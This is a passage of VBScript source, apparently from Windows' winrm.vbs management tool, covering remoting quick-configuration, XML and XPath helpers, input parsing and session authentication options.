    end if
           
    set e = Nothing 
    Enumerate = ""
end function

'''''''''''''''''''''    
private function GetSuffix(resUri)
    ASSERTBOOL Len(resUri) <> 0, GetResource("UWcPq")

    GetSuffix = "_INPUT"
end function

'''''''''''''''''''''    
' QuickConfig helper
Private Function QuickConfig(session, cmdlineOptions)
    QuickConfigRemoting session, cmdlineOptions, true
    If Err.Number <> 0 Then
        Exit Function
    End If
    QuickConfigRemoting session, cmdlineOptions, false
End function

Private Function QuickConfigRemoting(session, cmdlineOptions, serviceOnly)
    Dim analysisInputXml
    Dim analysisOutputXml
    Dim analysisOutput
    Dim transport
    Dim action
    
    If (serviceOnly = false) Then
        If (Not cmdlineOptions.ArgumentExists(NPARA_TRANSPORT)) Then
            transport = "http"
        Else
            transport = cmdlineOptions.Argument(NPARA_TRANSPORT)
        End If
    End If

    If (serviceOnly = true) Then
        analysisInputXml = "<AnalyzeService_INPUT xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/service""></AnalyzeService_INPUT>"
        action = "AnalyzeService"
    ElseIf (cmdlineOptions.ArgumentExists(NPARA_FORCE)) Then
        analysisInputXml =  "<Analyze_INPUT xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/service""><Transport>" & transport & "</Transport><Force/></Analyze_INPUT>"
        action = "Analyze"
    Else
        analysisInputXml = "<Analyze_INPUT xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/service""><Transport>" & transport & "</Transport></Analyze_INPUT>"
        action = "Analyze"
    End If
    On Error Resume Next
    analysisOutputXml = sessionObj.Invoke(action, "winrm/config/service", analysisInputXml)
    If Err.Number <> 0 Then
        Exit Function
    End If

'wscript.echo analysisOutputXml

    On Error Resume Next
    Set analysisOutput = CreateObject("MSXML2.DOMDocument.6.0")
    If Err.number <> 0 Then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_MSXML6MISSING_Message")
        Exit Function
    End If

    analysisOutput.LoadXML(analysisOutputXml)
    If (analysisOutput.parseError.errorCode <> 0) Then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_XMLERROR_Message") & paramXmlFile.parseError.reason
        Exit Function
    End If

    Dim xpathEnabled
    Dim xpathText
    Dim xpathUpdate
    If (serviceOnly = true) Then
        xpathEnabled = "/s:AnalyzeService_OUTPUT/s:RemotingEnabled"
        xpathText    = "/s:AnalyzeService_OUTPUT/s:Results"
        xpathUpdate  = "/s:AnalyzeService_OUTPUT/s:EnableService_INPUT"
    Else
        xpathEnabled = "/s:Analyze_OUTPUT/s:RemotingEnabled"
        xpathText    = "/s:Analyze_OUTPUT/s:Results"
        xpathUpdate  = "/s:Analyze_OUTPUT/s:EnableRemoting_INPUT"
    End If
    
    Dim enabled
    Dim displayText
    Dim updateInputXml
    Dim source
    
    enabled = GetElementByXpath(analysisOutput, xpathEnabled)
    source = GetElementAttributeByXpath(analysisOutput, xpathEnabled, "Source")
    
    If (enabled = "true") Then
        If (serviceOnly = true) Then
            stdOut.WriteLine GetResource("L_QuickConfigNoServiceChangesNeeded_Message2")
        Else
            stdOut.WriteLine GetResource("L_QuickConfigNoChangesNeeded_Message")
        End If
        Exit Function
    End If
    If (enabled <> "false") Then
        stdErr.WriteLine GetResource("L_QuickConfig_InvalidBool_0_ErrorMessage")
        Exit Function
    End If

    displayText    = GetElementByXpath(analysisOutput, xpathText)
    updateInputXml = GetElementByXpath(analysisOutput, xpathUpdate)

    if (source = "GPO") Then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_QuickConfig_RemotingDisabledbyGP_00_ErrorMessage")
        stdErr.WriteLine displayText
        Exit Function
    End If

'wscript.echo updateInputXml
    
    If (updateInputXml = "" OR displayText = "") Then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_QuickConfig_MissingUpdateXml_0_ErrorMessage")
        Exit Function
    End If 
    
    If (serviceOnly = true) Then
        stdOut.writeline GetResource("L_QuickConfig_ServiceUpdatesNeeded_0_Message")
    Else
        stdOut.writeline GetResource("L_QuickConfig_UpdatesNeeded_0_Message")
    End If
    stdOut.writeline GetResource("L_QuickConfig_UpdatesNeeded_1_Message")
    stdOut.writeline ""
    stdOut.writeline displayText
    stdOut.writeline ""

    If (Not cmdlineOptions.ArgumentExists(NPARA_QUIET) And Not cmdlineOptions.ArgumentExists(NPARA_FORCE)) Then
        stdOut.write     GetResource("L_QuickConfig_Prompt_0_Message")
        dim answer
        answer = LCase(stdIn.ReadLine)
        If answer <> "y" And answer <> "yes" Then
            Exit Function
        End If
        stdOut.writeline ""
    End If

    Dim updateOutputXml
    If (serviceOnly = true) Then
        action = "EnableService"
    Else
        action = "EnableRemoting"
    End If

    On Error Resume Next
    updateOutputXml = sessionObj.Invoke(action, "winrm/config/service", updateInputXml)
    If Err.Number <> 0 Then
        Exit Function
    End If

'wscript.echo updateOutputXml

    Dim updateOutput

    On Error Resume Next
    Set updateOutput = CreateObject("MSXML2.DOMDocument.6.0")
    If Err.number <> 0 Then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_MSXML6MISSING_Message")
        Exit Function
    End If

    updateOutput.LoadXML(updateOutputXml)
    If (updateOutput.parseError.errorCode <> 0) Then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_XMLERROR_Message") & paramXmlFile.parseError.reason
        Exit Function
    End If

    Dim xpathStatus
    Dim xpathResult
    If (serviceOnly = true) Then
        xpathStatus = "/s:EnableService_OUTPUT/s:Status"
        xpathResult = "/s:EnableService_OUTPUT/s:Results"
    Else
        xpathStatus = "/s:EnableRemoting_OUTPUT/s:Status"
        xpathResult = "/s:EnableRemoting_OUTPUT/s:Results"
    End If

    Dim status
    Dim resultText
    status     = GetElementByXpath(updateOutput, xpathStatus)
    resultText = GetElementByXpath(updateOutput, xpathResult)
    If (status = "succeeded") Then
        If (serviceOnly = true) Then
            stdOut.WriteLine GetResource("L_QuickConfigUpdatedService_Message")
        Else
            stdOut.WriteLine GetResource("L_QuickConfigUpdated_Message")
        End If
    Else
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_QuickConfigUpdateFailed_ErrorMessage")
    End If

    If (resultText <> "") Then
        stdOut.WriteLine ""
        stdOut.WriteLine resultText
    End If

End Function

'''''''''''''''''''''    
' Helper to run xpath over msxml obj and find single element
Private Function GetElementByXpath(msxmlObj, xpath)
    GetElementByXpath = ""

    msxmlObj.setProperty "SelectionLanguage", "XPath" 
    msxmlObj.setproperty "SelectionNamespaces", "xmlns:s=""http://schemas.microsoft.com/wbem/wsman/1/config/service""" 

    Dim elementList
    Dim currentElement

    Set currentElement = msxmlObj.selectSingleNode(xpath)
    If Not currentElement is Nothing Then
        If currentElement.hasChildNodes() Then
            If currentElement.childNodes.length = 1 Then
                dim aNode
                Set aNode = currentElement.childNodes.nextNode()
                If aNode.nodeType = NODE_TEXT Then
                    GetElementByXpath = aNode.text
                Exit Function
                End If
            End If
        End If
        GetElementByXpath = currentElement.xml
    End If
    Exit Function

    Set elementList = msxmlObj.selectNodes(xpath)
    If elementList.length = 1 Then
        Set currentElement = elementList.nextNode()
        If currentElement.nodeType = NODE_TEXT Then
            GetElementByXpath = currentElement.text
        Else
            GetElementByXpath = currentElement.xml
        End If
    End If
End Function
'''''''''''''''''''''    
' Helper to run xpath over msxml obj and find single element
Private Function GetElementAttributeByXpath(msxmlObj, xpath, attributeName)
    GetElementAttributeByXpath = ""

    msxmlObj.setProperty "SelectionLanguage", "XPath" 
    msxmlObj.setproperty "SelectionNamespaces", "xmlns:s=""http://schemas.microsoft.com/wbem/wsman/1/config/service""" 

    Dim currentElement

    Set currentElement = msxmlObj.selectSingleNode(xpath)
    GetElementAttributeByXpath = currentElement.getAttribute("Source")
        
End Function

'''''''''''''''''''''    
' Helper to run xpath over msxml obj and find single element
Private Function GetElementXml(msxmlObj, currentElement)
    GetElementXml = ""

    msxmlObj.setProperty "SelectionLanguage", "XPath" 
    msxmlObj.setproperty "SelectionNamespaces", "xmlns:s=""http://schemas.microsoft.com/wbem/wsman/1/config/service""" 

    Dim elementList
    
    GetElementByXpath = currentElement.xml
    
End Function

'''''''''''''''''''''    
' Returns XML ns depending on the type of URI

private function GetXmlNs(resUri)
    dim resUriLCase
    dim s1
    dim s2
    
    ASSERTBOOL Len(resUri) <> 0, GetResource("UWcPq")

    resUriLCase = LCase(resUri)

    if InStr(resUriLCase, URI_IPMI) <> 0 then
        GetXmlNs = StripParams(resUri)
    elseif InStr(resUriLCase, URI_WMI) <> 0 then
        GetXmlNs = StripParams(resUri)
    else 
        '//GetXmlNs = StripParams(resUri) & ".xsd"
        '//This was reported by Intel as an interop issue. So now we are not appending a .xsd in the end.
        GetXmlNs = StripParams(resUri)
    end if
    
    GetXmlNs = "xmlns:p=""" & GetXmlNs & """"
end function

'''''''''''''''''''''    
' Verify if target is in IPv6 format

private function IsIPv6(target)
    dim regexpObj
    Set regexpObj = New RegExp

    regexpObj.Pattern = PTRN_IPV6_S
    regexpObj.IgnoreCase = TRUE
    dim matches
    set matches = regExpObj.Execute(target)
    if matches.Count <> 0 then
        IsIPv6 = true
    else 
        IsIPv6 = false
    end if
end function

'''''''''''''''''''''    
' Extracts XML root node nm. from URI

private function GetRootNodeName(opr, resUri, actUri)
    dim uriTmp
    dim sfx
    dim s

    dim regexpObj
    Set regexpObj = New RegExp
         
    ASSERTBOOL Len(opr) <> 0, "'opr' parameter is 0 length or null"    
    
    sfx = ""
    select case opr
        case OP_PUT 
            uriTmp = resUri     
        case OP_CRE
            uriTmp = resUri
        case OP_INV
            uriTmp = actUri
            sfx = GetSuffix(resUri)
        case else 
            GetRootNodeName = ""
            exit function
    end select
    ASSERTBOOL Len(uriTmp) <> 0, GetResource("UWcPq")

    uriTmp = StripParams(uriTmp)

    regexpObj.Pattern = PTRN_URI_LAST
    regexpObj.IgnoreCase = TRUE
    dim matches
    set matches = regexpObj.Execute(uriTmp)
    ASSERTBOOL matches.Count = 1, GetResource("L_NOLASTTOK_Message")

    uriTmp = matches(0)
    ASSERTBOOL Len(uriTmp) <> 0, GetResource("L_URIZEROTOK_Message")
             
    GetRootNodeName = uriTmp & sfx
end function

private function ProcessParameterHash(hashString)
    on error resume next    
    dim matches
    dim m

    dim regexpObj

    Set regexpObj = New RegExp
    regexpObj.Global = True
    regexpObj.IgnoreCase = True

    dim resultDictionary
    set resultDictionary = CreateObject("Scripting.Dictionary")

    
    If Len(hashString) > 0 then    
        If Len(hashString) > 2 Then
            If Mid(hashString,1,1) <> "{" Or Mid(hashString,Len(hashString),1) <> "}" Then
                stdErr.WriteLine GetResource("JgScy")
                set ProcessParameterHash = Nothing
                Exit Function
            End If

            regexpObj.Pattern = PTRN_HASH_VALIDATE
            regexpObj.ignoreCase = true
            set matches = regexpObj.Execute(hashString)
            if matches.Count <> 1 then
                stdErr.WriteLine GetResource("JgScy")
                set ProcessParameterHash = Nothing
                Exit Function
            end if

            'following check ensures that if we have unmatched substrings
            'we report a syntax error. the way we determine is first to 
            'calculate the expected string length by going through all
            'the matches and then comparing with input string length

            dim expectedLength

            regexpObj.Pattern = PTRN_HASH_TOK
            regexpObj.ignoreCase = true
            set matches = regexpObj.Execute(hashString)

            expectedLength = matches.Count-1
            for each m in matches             
                expectedLength = expectedLength + m.Length
            next
            'account for starting and closing {}
            expectedLength = expectedLength + 2
            if (expectedLength <> Len(hashString)) then 
                stdErr.WriteLine GetResource("JgScy")
                set ProcessParameterHash = Nothing
                Exit Function
            end if
             
            regexpObj.Pattern = PTRN_HASH_TOK
            regexpObj.ignoreCase = true
            set matches = regexpObj.Execute(hashString)
            if matches.Count > 0 then
                for each m in matches
                    if resultDictionary.Exists(m.Submatches(0)) then
                        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_PUT_PARAM_NOARRAY_Message") & m.Submatches(0)
                        set ProcessParameterHash = Nothing
                        Exit Function
                    end if
                    if LCase(m.Submatches(1)) = "$null" then
                        resultDictionary.Add m.Submatches(0),null
                    else
                        resultDictionary.Add m.Submatches(0),m.Submatches(2)
                    end if
                next
            end if
        ElseIf hashString <> "{}" Then
            stdErr.WriteLine GetResource("JgScy")
            set ProcessParameterHash = Nothing
            Exit Function
        End If
    Else
        stdErr.WriteLine GetResource("JgScy")
        set ProcessParameterHash = Nothing
        Exit Function
    End If
        
    set ProcessParameterHash = resultDictionary
end function


private function CreateAndInitializeResourceLocator(wsman,resourceUri,cmdlineOptions)
    on error resume next
    
    Dim key
    dim resourceLocator
    dim paramMap
    Dim optionsValue

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    ' create the resource locator object

    Set resourceLocator = Wsman.CreateResourceLocator(resourceUri)
    if Err.number <> 0 then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_RESOURCELOCATOR_Message")
        set CreateAndInitializeResourceLocator = Nothing
        exit function
    end if

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    ' set the options on the resource locator
    optionsValue = cmdlineOptions.Argument("options")
    If Len(optionsValue) Then
        set paramMap = ProcessParameterHash(optionsValue)
        if paramMap Is Nothing then
            set CreateAndInitializeResourceLocator = Nothing
            'todo exit function
        end if
        for each key in paramMap
            if IsNull(paramMap(key)) then
                resourceLocator.AddOption key, null
            else
                resourceLocator.AddOption key,paramMap(key)
            end if
        next
    End If

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    ' set the fragment path and fragment dialect on the resource locator

    if(cmdlineOptions.ArgumentExists(NPARA_FRAGMENT)) then
        resourceLocator.FragmentPath = cmdlineOptions.Argument(NPARA_FRAGMENT)
    end if
    if(cmdlineOptions.ArgumentExists(NPARA_DIALECT)) then
        resourceLocator.FragmentDialect = cmdlineOptions.Argument(NPARA_DIALECT)
    end if

    set CreateAndInitializeResourceLocator = resourceLocator
end function



'''''''''''''''''''''    
' Reads input XML from the stdin or builds XML from @{...}

private function ProcessInput(wsman, operation, root, cmdlineOptions, resourceLocator,sessionObj,inputStr,formatOption)
    on error resume next
    
    dim parameterDic,key
    
    dim putStr
    dim elementList
    dim currentElement
    dim paramXmlFile
    dim tmpNode
    dim parameterString
    dim parameterCount
    dim xmlns
    
    'make sure it's a relevent operation
    select case operation
        case OP_PUT 
        case OP_CRE
        case OP_INV
        case else 
            inputStr = ""
            ProcessInput = true
            exit function
    end select

    xmlns = GetXmlNs(resourceLocator.ResourceURI)

    'process the parameters into a Map
    parameterString = cmdlineOptions.Argument(NPARA_PSEUDO_AT)
    parameterCount = 0
    If Len(parameterString) Then
        set parameterDic = ProcessParameterHash(parameterString)
        'if parameter processing failed, exit
        if parameterDic Is Nothing then
            set ProcessInput = false
            exit function
        end if
        parameterCount = parameterDic.Count
    End If
    
    'if there were no parameters, get from file
    if parameterCount = 0 then 
        if cmdlineOptions.ArgumentExists(NPARA_FILE) then
            inputStr = ReadFile(cmdlineOptions.Argument(NPARA_FILE))
            ProcessInput = true
            exit function
        end if
    end if

    if operation = OP_CRE Or operation = OP_INV  then
        dim nilns
        nilns = ""
        dim parameters
        parameters = ""                
    if parameterCount > 0 then 
            for each key in parameterDic
                parameters = parameters & "<p:" & key
                if IsNull(parameterDic(key)) then
                    parameters = parameters & " " & ATTR_NIL
                    nilns = " " & NS_XSI
                end if 
                parameters = parameters & ">" & Escape(parameterDic(key)) & _
                    "</p:" & key & ">"                     
            next
        end if

        putStr = "<p:" & root & " " & xmlns & nilns & ">" & _
            parameters & "</p:" & root & ">"

    elseif operation = OP_PUT then

        if parameterCount = 0 then
                stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_PUT_PARAM_NOINPUT_Message")
            inputStr = ""
            ProcessInput = false
            exit function
        end if
        
        'get the original resource xml
        on error resume next
        putStr = sessionObj.Get(resourceLocator)
        if Err.Number <> 0 then
            ASSERTERR sessionObj, formatOption
            inputStr = ""
            ProcessInput = false
            exit function
        end if
        
        'create an MSXML DomDocument object to work with the resource xml
        on error resume next
        Set paramXmlFile = CreateObject("MSXML2.DOMDocument.6.0")
        if Err.number <> 0 then
            stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_MSXML6MISSING_Message")
            inputStr = ""
            ProcessInput = false
            exit function
        end if
        paramXmlFile.async = false
        
        'load the domdocument with the resource xml   
        paramXmlFile.LoadXML(putStr)
        if (paramXmlFile.parseError.errorCode <> 0) then
            stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_XMLERROR_Message") & paramXmlFile.parseError.reason
            inputStr = ""
            ProcessInput = false
            exit function
        end if
        paramXmlFile.setProperty "SelectionLanguage", "XPath" 
        
        'loop through the command-line name/value pairs
        for each key in parameterDic
           'find the elements matching the key
            Dim xpathString
            xpathString = "/*/*[local-name()=""" & key & """]"
            if LCase(key) = "location" then
                'Ignore cim:Location
                xpathString = "/*/*[local-name()=""" & key & """ and namespace-uri() != """ & NS_CIMBASE & """]"
            end if
            Set elementList = paramXmlFile.selectNodes(xpathString)
            
            'make sure there is 1 - error on 0 or > 1
            if elementList.length = 0 then
                stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_PUT_PARAM_NOMATCH_Message") & key
                inputStr = ""
                ProcessInput = false
                Exit Function
            elseif elementList.length > 1 then
                stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_PUT_PARAM_MULTIMATCH_Message") & key
                inputStr = ""
                ProcessInput = false
                Exit Function                  
            else      
                'get the node from the list
                Set currentElement = elementList.nextNode()
                'make sure the node does not have anything other than 1 or less text children                    
                if currentElement.hasChildNodes() then
                    if currentElement.childNodes.length > 1 then
                        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_PUT_PARAM_NOTATTR_Message") & key
                        inputStr = ""
                        ProcessInput = false
                        Exit Function
                    else
                        dim aNode
                        Set aNode = currentElement.childNodes.nextNode()
                        if aNode.nodeType <> NODE_TEXT then
                            stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_PUT_PARAM_NOTATTR_Message") & key
                            inputStr = ""
                            ProcessInput = false
                            Exit Function
                        end if
                    end if
                end if
                if IsNull(parameterDic(key)) then
                    Set tmpNode = paramXmlFile.createNode(NODE_ATTRIBUTE,ATTR_NIL_NAME,NS_XSI_URI)
                    tmpNode.text = "true"
                    currentElement.setAttributeNode tmpNode
                    currentElement.text = ""
                else
                    'delete nil attribute if present
                    currentElement.attributes.removeNamedItem(ATTR_NIL_NAME)
                    currentElement.text = parameterDic(key)
                end if
            end If        
        next
        putStr = paramXmlFile.xml
    end if
    inputStr = putStr
    ProcessInput = true
end function

private function ReadStdIn()
    while Not stdIn.AtEndOfStream
        ReadStdIn = ReadStdIn & stdIn.ReadAll
    wend
end function

'''''''''''''''''''''    
' Escapes non XML chars

private function Escape(str)
    dim i 
    for i = 1 to Len(str)
        select case Mid(str, i, 1)
            case "&" 
                Escape = Escape & "&amp;"
            case "<"
                Escape = Escape & "&lt;"
            case ">"
                Escape = Escape & "&gt;"
            case """"
                Escape = Escape & "&quot;"
            case "'"
                Escape = Escape & "&apos;"
            case else 
                Escape = Escape & Mid(str, i, 1)
        end select
    next
end function

'''''''''''''''''''''    
' Checks if this script is running under cscript.exe

private function IsCScriptEnv()
    if InStrRev(LCase(WScript.FullName), "cscript.exe", -1) <> 0 then
        IsCScriptEnv = True
    else 
        IsCScriptEnv = False
    end if
end function

private function CreateSession(wsman, conStr, optDic, formatOption)
    dim sessionFlags
    dim conOpt 
    dim session
    dim authVal
    dim encodingVal
    dim encryptVal
    dim pw
    dim tout
    ' proxy information
    dim proxyAccessType
    dim proxyAccessTypeVal
    dim proxyAuthenticationMechanism
    dim proxyAuthenticationMechanismVal
    dim proxyUsername
    dim proxyPassword
     
    sessionFlags = 0
    proxyAccessType = 0
    proxyAccessTypeVal = 0
    proxyAuthenticationMechanism = 0
    proxyAuthenticationMechanismVal = 0
    proxyUsername = ""
    proxyPassword = ""
    
    set conOpt = Nothing

    if optDic.ArgumentExists(NPARA_ENCODING) then
        ASSERTNAL(NPARA_ENCODING)
        ASSERTBOOL optDic.ArgumentExists(NPARA_REMOTE), "The '-encoding' option is only valid when used with the '-remote' option"
        encodingVal = optDic.Argument(NPARA_ENCODING)
        if LCase(encodingVal) = "utf-16" then
            sessionFlags = sessionFlags OR wsman.SessionFlagUTF16
        elseif LCase(encodingVal) = "utf-8" then
            sessionFlags = sessionFlags OR wsman.SessionFlagUTF8
        else
            ' Invalid!  
            ASSERTBOOL false, "The specified encoding flag is invalid."
        end if
    end if

    if optDic.ArgumentExists(NPARA_UNENCRYPTED) then
        ASSERTBOOL optDic.ArgumentExists(NPARA_REMOTE),     "The '-" & NPARA_UNENCRYPTED & "' option is only valid when used with the '-remote' option"
        'C API will ensure that unencrypted is only used w/ http
        sessionFlags = sessionFlags OR wsman.SessionFlagNoEncryption
    end if

    if optDic.ArgumentExists(NPARA_USESSL) then
        ASSERTBOOL optDic.ArgumentExists(NPARA_REMOTE),     "The '-" & NPARA_USESSL & "' option is only valid when used with the '-remote' option"
        sessionFlags = sessionFlags OR wsman.SessionFlagUseSsl
    end if


    if optDic.ArgumentExists(NPARA_AUTH) then
        ASSERTNAL(NPARA_AUTH)
        authVal = optDic.Argument(NPARA_AUTH)
        select case LCase(authVal)
            case VAL_NO_AUTH
                sessionFlags = sessionFlags OR wsman.SessionFlagUseNoAuthentication
                ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT),     "The '-" & NPARA_CERT & "' option is not valid for '-auth:none'"
                ASSERTBOOL not optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option is not valid for '-auth:none'"
                ASSERTBOOL not optDic.ArgumentExists(NPARA_PASSWORD), "The '-" & NPARA_PASSWORD & "' option is only valid for '-auth:none'"
            case VAL_BASIC
                'Use -username and -password.  
                ASSERTBOOL optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option must be specified for '-auth:basic'"
                ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option is not valid for '-auth:basic'"
                sessionFlags = sessionFlags OR wsman.SessionFlagCredUsernamePassword OR wsman.SessionFlagUseBasic
            case VAL_DIGEST
                'Use -username and -password.  
                ASSERTBOOL optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option must be specified for '-auth:digest'"
                ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option is not valid for '-auth:digest'"
                sessionFlags = sessionFlags OR wsman.SessionFlagCredUsernamePassword OR wsman.SessionFlagUseDigest
            case VAL_KERBEROS
                '-username and -password are optional.  
                ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option is not valid for '-auth:kerberos'"
                sessionFlags = sessionFlags OR wsman.SessionFlagUseKerberos
            case VAL_NEGOTIATE
                '-username and -password are optional.  
                ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option is not valid for '-auth:negotiate'"
                sessionFlags = sessionFlags OR wsman.SessionFlagUseNegotiate
            case VAL_CERT
                '-certificate is mandatory.  
                ASSERTBOOL optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option must be specified for '-auth:certificate'"
                '-username or -password must not be used
                ASSERTBOOL not optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option is not valid for '-auth:certificate'"
                ASSERTBOOL not optDic.ArgumentExists(NPARA_PASSWORD), "The '-" & NPARA_PASSWORD & "' option is not valid for '-auth:certificate'"
                sessionFlags = sessionFlags OR wsman.SessionFlagUseClientCertificate
            case VAL_CREDSSP
                'Use -username and -password.  
                ASSERTBOOL osVersion >= osVista, "The specified '-" & NPARA_AUTH & "' flag '" & authVal & "' has an invalid value."
                ASSERTBOOL optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option must be specified for '-auth:credssp'"
                ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option is not valid for '-auth:credssp'"
                sessionFlags = sessionFlags OR wsman.SessionFlagCredUsernamePassword OR wsman.SessionFlagUseCredSSP
            case else 
                ASSERTBOOL false, "The specified '-" & NPARA_AUTH & "' flag '" & authVal & "' has an invalid value."
        end select
    end if
   
    if optDic.ArgumentExists(NPARA_USERNAME) then
        ASSERTBOOL not optDic.ArgumentExists(NPARA_CERT), "The '-" & NPARA_CERT & "' option cannot be used together with '-username'"
        set conOpt = wsman.CreateConnectionOptions
        conOpt.UserName = optDic.Argument(NPARA_USERNAME)
        if optDic.ArgumentExists(NPARA_PASSWORD) then
            conOpt.Password = optDic.Argument(NPARA_PASSWORD)
        end if
        sessionFlags = sessionFlags OR wsman.SessionFlagCredUsernamePassword
    end if
    
    if optDic.ArgumentExists(NPARA_DEFAULTCREDS) then
        ASSERTBOOL not optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option cannot be used together with '-defaultCreds'"
        ASSERTBOOL not optDic.ArgumentExists(NPARA_PASSWORD), "The '-" & NPARA_PASSWORD & "' option cannot be used together with '-defaultCreds'"
        'this is only valid if -auth:Negotiate is specified 
        ASSERTBOOL (LCase(optDic.Argument(NPARA_AUTH)) = VAL_NEGOTIATE), "The " & NPARA_DEFAULTCREDS & " option is only valid when the authentication mechanism is " & VAL_NEGOTIATE 
        'C API will ensure this is only used w/ https
        sessionFlags = sessionFlags OR wsman.SessionFlagAllowNegotiateImplicitCredentials
    end if
    
    if optDic.ArgumentExists(NPARA_CERT) then
        ASSERTBOOL not optDic.ArgumentExists(NPARA_USERNAME), "The '-" & NPARA_USERNAME & "' option cannot be used together with '-certificate'"
        ASSERTBOOL not optDic.ArgumentExists(NPARA_PASSWORD), "The '-" & NPARA_PASSWORD & "' option cannot be used together with '-certificate'"
        set conOpt = wsman.CreateConnectionOptions
        conOpt.CertificateThumbprint = optDic.Argument(NPARA_CERT)
        if optDic.ArgumentExists(NPARA_AUTH) then
            ASSERTBOOL (LCase(optDic.Argument(NPARA_AUTH)) = VAL_CERT), "The " & NPARA_CERT & " option is only valid when the authentication mechanism is " & VAL_CERT
        end if
        '-auth might be missing, in which case we assume -a:Certificate
        sessionFlags = sessionFlags OR wsman.SessionFlagUseClientCertificate
    end if
    
    if optDic.ArgumentExists(NPARA_PROXYACCESS) then
        ASSERTNAL(NPARA_PROXYACCESS)
        if conOpt Is Nothing then
            set conOpt = wsman.CreateConnectionOptions
        end if
        proxyAccessTypeVal = optDic.Argument(NPARA_PROXYACCESS)
        select case LCase(proxyAccessTypeVal)
            case VAL_PROXY_IE_CONFIG
                proxyAccessType = conOpt.ProxyIEConfig
            case VAL_PROXY_WINHTTP_CONFIG
                proxyAccessType = conOpt.ProxyWinHttpConfig
            case VAL_PROXY_AUTODETECT
                proxyAccessType = conOpt.ProxyAutoDetect
            case VAL_PROXY_NO_PROXY_SERVER
                proxyAccessType = conOpt.ProxyNoProxyServer
            case else 
                ASSERTBOOL false, "The specified '-" & NPARA_PROXYACCESS & "' field '" & proxyAccessTypeVal & "' has an invalid value."
        end select
    end if    
    if optDic.ArgumentExists(NPARA_PROXYAUTH) then
        ASSERTNAL(NPARA_PROXYAUTH)
        ASSERTBOOL optDic.ArgumentExists(NPARA_PROXYACCESS),     "The '-" & NPARA_PROXYAUTH & "' option is only valid when used with the '-" & NPARA_PROXYACCESS & "' option"
        if conOpt Is Nothing then
            set conOpt = wsman.CreateConnectionOptions
        end if
        proxyAuthenticationMechanismVal = optDic.Argument(NPARA_PROXYAUTH)
        select case LCase(proxyAuthenticationMechanismVal)
            case VAL_BASIC
                proxyAuthenticationMechanism = conOpt.ProxyAuthenticationUseBasic
            case VAL_DIGEST
                proxyAuthenticationMechanism = conOpt.ProxyAuthenticationUseDigest
            case VAL_NEGOTIATE
                proxyAuthenticationMechanism = conOpt.ProxyAuthenticationUseNegotiate
            case else 
                ASSERTBOOL false, "The specified '-" & NPARA_PROXYAUTH & "' flag '" & proxyAuthenticationMechanismVal & "' has an invalid value."
        end select
    end if
    if optDic.ArgumentExists(NPARA_PROXYUSERNAME) then
        ASSERTBOOL optDic.ArgumentExists(NPARA_PROXYAUTH),     "The '-" & NPARA_PROXYUSERNAME & "' option is only valid when used with the '-" & NPARA_PROXYAUTH & "' option"
        proxyUsername = optDic.Argument(NPARA_PROXYUSERNAME)
    end if
    if optDic.ArgumentExists(NPARA_PROXYPASSWORD) then
        ASSERTBOOL optDic.ArgumentExists(NPARA_PROXYUSERNAME),     "The '-" & NPARA_PROXYPASSWORD & "' option is only valid when used with the '-" & NPARA_PROXYUSERNAME & "' option"
        proxyPassword = optDic.Argument(NPARA_PROXYPASSWORD)
    end if

    if optDic.ArgumentExists(NPARA_PROXYACCESS) then
        on error resume next
        responseStr = conOpt.SetProxy(proxyAccessType, proxyAuthenticationMechanism, proxyUsername, proxyPassword)
        ASSERTERR conOpt, formatOption
        on error goto 0
     end if

    if optDic.ArgumentExists(NPARA_NOCACHK) then
        'C API will ensure this is only used w/ https
        sessionFlags = sessionFlags OR wsman.SessionFlagSkipCACheck
    end if

    if optDic.ArgumentExists(NPARA_NOCNCHK) then
        'C API will ensure this is only used w/ https
        sessionFlags = sessionFlags OR wsman.SessionFlagSkipCNCheck
    end if

    if optDic.ArgumentExists(NPARA_NOREVCHK) then
        'C API will ensure this is only used w/ https
        sessionFlags = sessionFlags OR wsman.SessionFlagSkipRevocationCheck
    end if

    if optDic.ArgumentExists(NPARA_SPNPORT) then
        'this is only valid if -auth is not specified or if -auth:Negotiate or -auth:Kerberos is specified 
        if optDic.ArgumentExists(NPARA_AUTH) then
